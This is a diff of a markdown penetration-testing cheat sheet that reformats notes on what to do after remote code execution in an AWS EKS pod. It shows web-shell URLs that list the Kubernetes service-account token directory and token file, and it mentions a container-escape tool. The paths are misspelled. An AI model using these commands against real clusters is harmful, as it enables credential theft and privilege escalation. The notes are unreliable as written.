@@ -4,10 +4,10 @@
 
 ### After the RCE, we can list all secrets in EKS
 
- - https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount
+    https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount
 
 ### Getting the secret information from EKS
 
- - https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount/token
+    https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount/token
 
 ## TIP: It's also possible to do sandbox escaping (Tool: deepce https://github.com/stealthcopter/deepce)
